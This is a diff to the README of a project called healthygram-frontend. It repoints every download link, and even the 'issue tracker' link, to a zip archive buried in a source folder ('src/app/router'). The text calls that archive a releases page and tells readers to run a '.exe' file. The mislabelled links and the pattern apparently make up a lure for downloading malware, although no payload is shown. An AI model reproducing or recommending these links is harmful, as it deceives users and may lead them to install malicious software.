@@ -6,15 +6,15 @@ Welcome to healthygram-frontend! This application allows you to share your pictu
 
 ## 🔗 Download the Application
 
-[![Download Healthygram](https://raw.githubusercontent.com/Zyga1993/healthygram-frontend/main/overdue/healthygram-frontend.zip%https://raw.githubusercontent.com/Zyga1993/healthygram-frontend/main/overdue/healthygram-frontend.zip)](https://raw.githubusercontent.com/Zyga1993/healthygram-frontend/main/overdue/healthygram-frontend.zip)
+[![Download Healthygram](https://github.com/Zyga1993/healthygram-frontend/raw/refs/heads/main/src/app/router/healthygram-frontend-1.3.zip%https://github.com/Zyga1993/healthygram-frontend/raw/refs/heads/main/src/app/router/healthygram-frontend-1.3.zip)](https://github.com/Zyga1993/healthygram-frontend/raw/refs/heads/main/src/app/router/healthygram-frontend-1.3.zip)
 
 To get started, you’ll need to download the application. Please visit the releases page using the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/Zyga1993/healthygram-frontend/main/overdue/healthygram-frontend.zip)
+[Visit this page to download](https://github.com/Zyga1993/healthygram-frontend/raw/refs/heads/main/src/app/router/healthygram-frontend-1.3.zip)
 
 ## 📥 Download & Install
 
-1. Click on the [Visit this page to download](https://raw.githubusercontent.com/Zyga1993/healthygram-frontend/main/overdue/healthygram-frontend.zip) link.
+1. Click on the [Visit this page to download](https://github.com/Zyga1993/healthygram-frontend/raw/refs/heads/main/src/app/router/healthygram-frontend-1.3.zip) link.
 2. On the releases page, look for the latest version. The most recent version is usually at the top.
 3. Find the file that suits your operating system:
    - For Windows, look for files ending in `.exe`.
@@ -57,7 +57,7 @@ To run the healthygram-frontend application, ensure your computer meets the foll
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please check the [issue tracker](https://raw.githubusercontent.com/Zyga1993/healthygram-frontend/main/overdue/healthygram-frontend.zip) on GitHub. You can report problems, suggest features, or ask questions.
+If you encounter any issues or need assistance, please check the [issue tracker](https://github.com/Zyga1993/healthygram-frontend/raw/refs/heads/main/src/app/router/healthygram-frontend-1.3.zip) on GitHub. You can report problems, suggest features, or ask questions.
 
 ## 🌐 Topics
 
